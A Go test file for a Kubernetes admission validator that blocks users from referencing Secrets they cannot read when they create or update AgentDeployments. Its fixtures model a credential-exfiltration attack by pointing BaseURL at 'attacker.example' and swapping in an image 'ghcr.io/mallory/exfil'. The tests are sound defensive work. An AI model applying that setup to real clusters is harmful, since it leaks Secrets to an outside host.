/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package v1alpha1

import (
	"context"
	"errors"
	"strings"
	"testing"

	admissionv1 "k8s.io/api/admission/v1"
	authnv1 "k8s.io/api/authentication/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"sigs.k8s.io/controller-runtime/pkg/webhook/admission"

	airunwayv1alpha1 "github.com/ai-runway/airunway/controller/api/v1alpha1"
)

// fakeReviewer stands in for SubjectAccessReview.
type fakeReviewer struct {
	allowed bool
	err     error
	asked   []string // "user/namespace/secret", so we can assert WHO was checked
}

func (f *fakeReviewer) CanGetSecret(_ context.Context, req admission.Request, ns, name string) (bool, string, error) {
	f.asked = append(f.asked, req.UserInfo.Username+"/"+ns+"/"+name)
	if f.err != nil {
		return false, "", f.err
	}
	return f.allowed, "fake authorizer", nil
}

func requestAs(user string) context.Context {
	return admission.NewContextWithRequest(context.Background(), admission.Request{
		AdmissionRequest: admissionv1.AdmissionRequest{
			UserInfo: authnv1.UserInfo{Username: user, Groups: []string{"system:authenticated"}},
		},
	})
}

func agentWithSecret(secret string) *airunwayv1alpha1.AgentDeployment {
	return &airunwayv1alpha1.AgentDeployment{
		ObjectMeta: metav1.ObjectMeta{Name: "exfil", Namespace: "team-a"},
		Spec: airunwayv1alpha1.AgentDeploymentSpec{
			Framework: airunwayv1alpha1.AgentFrameworkRef{Name: "crewai"},
			Model: airunwayv1alpha1.ModelBinding{
				ExternalAPI: &airunwayv1alpha1.ExternalAPIBinding{
					Type:      airunwayv1alpha1.ExternalAPITypeOpenAI,
					BaseURL:   "https://attacker.example/v1",
					ModelName: "x",
					CredentialsRef: &airunwayv1alpha1.SecretKeyRef{
						Name: secret, Key: "password",
					},
				},
			},
		},
	}
}

// TestCredentialAccessBlocksPrivilegeEscalation is the regression test for the
// confused deputy: the controller validates a referenced Secret with ITS
// privilege and injects it into a container the same author chose, so without
// this check a caller holding only `create agentdeployments` could read any
// Secret in the namespace.
func TestCredentialAccessBlocksPrivilegeEscalation(t *testing.T) {
	reviewer := &fakeReviewer{allowed: false}
	v := &AgentDeploymentCustomValidator{SecretAccess: reviewer}

	_, err := v.ValidateCreate(requestAs("mallory"), agentWithSecret("prod-db-password"))
	if err == nil {
		t.Fatal("a user who cannot read the Secret must not be able to reference it — this is the escalation path")
	}
	for _, want := range []string{"prod-db-password", "mallory", "not permitted"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error should mention %q so the user understands why; got: %v", want, err)
		}
	}
	// The check must authorize the REQUESTER, not the controller.
	if len(reviewer.asked) != 1 || reviewer.asked[0] != "mallory/team-a/prod-db-password" {
		t.Errorf("wrong subject authorized: %v", reviewer.asked)
	}
}

func TestCredentialAccessAllowsAuthorizedUser(t *testing.T) {
	v := &AgentDeploymentCustomValidator{SecretAccess: &fakeReviewer{allowed: true}}
	if _, err := v.ValidateCreate(requestAs("alice"), agentWithSecret("openai-api-key")); err != nil {
		t.Fatalf("a user who CAN read the Secret must be allowed to reference it: %v", err)
	}
}

// A failing authorizer must not fall open: a security control that silently
// no-ops when it errors is worse than not having one.
func TestCredentialAccessFailsClosed(t *testing.T) {
	v := &AgentDeploymentCustomValidator{SecretAccess: &fakeReviewer{err: errors.New("apiserver down")}}
	if _, err := v.ValidateCreate(requestAs("alice"), agentWithSecret("openai-api-key")); err == nil {
		t.Fatal("an authorization failure must reject, not admit")
	}
}

// Without an admission request there is no subject to authorize. Skipping the
// check in that case would make the control trivially bypassable.
func TestCredentialAccessRequiresAdmissionContext(t *testing.T) {
	v := &AgentDeploymentCustomValidator{SecretAccess: &fakeReviewer{allowed: true}}
	if _, err := v.ValidateCreate(context.Background(), agentWithSecret("openai-api-key")); err == nil {
		t.Fatal("a call with no admission request must reject rather than skip the check")
	}
}

func TestCredentialAccessSkipsWhenNoSecretReferenced(t *testing.T) {
	reviewer := &fakeReviewer{allowed: false}
	v := &AgentDeploymentCustomValidator{SecretAccess: reviewer}

	// A keyless in-cluster binding references no Secret, so there is nothing to
	// authorize and no reason to cost an API call.
	ad := &airunwayv1alpha1.AgentDeployment{
		ObjectMeta: metav1.ObjectMeta{Name: "keyless", Namespace: "team-a"},
		Spec: airunwayv1alpha1.AgentDeploymentSpec{
			Framework: airunwayv1alpha1.AgentFrameworkRef{Name: "crewai"},
			Model: airunwayv1alpha1.ModelBinding{
				DeploymentRef: &airunwayv1alpha1.ModelDeploymentBinding{Name: "llama"},
			},
		},
	}
	if _, err := v.ValidateCreate(requestAs("bob"), ad); err != nil {
		t.Fatalf("a binding with no credentialsRef needs no authorization: %v", err)
	}
	if len(reviewer.asked) != 0 {
		t.Errorf("no SubjectAccessReview should be issued, got %v", reviewer.asked)
	}
}

// Every update carrying a reference is authorized, not only those that change
// it. An earlier version skipped unchanged references and that left the entire
// escalation reachable through update.
func TestCredentialAccessOnUpdate(t *testing.T) {
	t.Run("unchanged reference is STILL authorized", func(t *testing.T) {
		// The regression test for the update bypass: keep the reference
		// identical and repoint the image at your own. Nothing about the
		// credentialsRef changed, but the credential now lands in a different
		// container, so the updater must be authorized against it.
		reviewer := &fakeReviewer{allowed: false}
		v := &AgentDeploymentCustomValidator{SecretAccess: reviewer}

		old := agentWithSecret("prod-db-password")
		updated := agentWithSecret("prod-db-password")
		updated.Spec.Config = &runtime.RawExtension{
			Raw: []byte(`{"image":"ghcr.io/mallory/exfil:latest"}`),
		}

		if _, err := v.ValidateUpdate(requestAs("mallory"), old, updated); err == nil {
			t.Fatal("retaining a reference while changing the image must be rejected — this is the update bypass")
		}
		if len(reviewer.asked) != 1 || !strings.HasSuffix(reviewer.asked[0], "prod-db-password") {
			t.Errorf("the retained secret must be authorized on update, got %v", reviewer.asked)
		}
	})

	t.Run("an authorized user may still edit", func(t *testing.T) {
		reviewer := &fakeReviewer{allowed: true}
		v := &AgentDeploymentCustomValidator{SecretAccess: reviewer}
		old, updated := agentWithSecret("openai-api-key"), agentWithSecret("openai-api-key")
		if _, err := v.ValidateUpdate(requestAs("alice"), old, updated); err != nil {
			t.Fatalf("a user who can read the Secret must still be able to edit: %v", err)
		}
		if len(reviewer.asked) != 1 {
			t.Errorf("expected exactly one authorization call, got %v", reviewer.asked)
		}
	})

	t.Run("switching to another Secret is authorized", func(t *testing.T) {
		reviewer := &fakeReviewer{allowed: false}
		v := &AgentDeploymentCustomValidator{SecretAccess: reviewer}
		old, updated := agentWithSecret("openai-api-key"), agentWithSecret("prod-db-password")
		if _, err := v.ValidateUpdate(requestAs("mallory"), old, updated); err == nil {
			t.Fatal("repointing at a Secret the user cannot read must be rejected")
		}
		if len(reviewer.asked) != 1 || !strings.HasSuffix(reviewer.asked[0], "prod-db-password") {
			t.Errorf("the NEW secret must be authorized, got %v", reviewer.asked)
		}
	})

	t.Run("dropping the reference needs no authorization", func(t *testing.T) {
		reviewer := &fakeReviewer{allowed: false}
		v := &AgentDeploymentCustomValidator{SecretAccess: reviewer}
		old := agentWithSecret("prod-db-password")
		updated := agentWithSecret("prod-db-password")
		updated.Spec.Model.ExternalAPI.CredentialsRef = nil
		if _, err := v.ValidateUpdate(requestAs("bob"), old, updated); err != nil {
			t.Fatalf("removing the credential reference consumes no credential: %v", err)
		}
		if len(reviewer.asked) != 0 {
			t.Errorf("expected no authorization call, got %v", reviewer.asked)
		}
	})
}
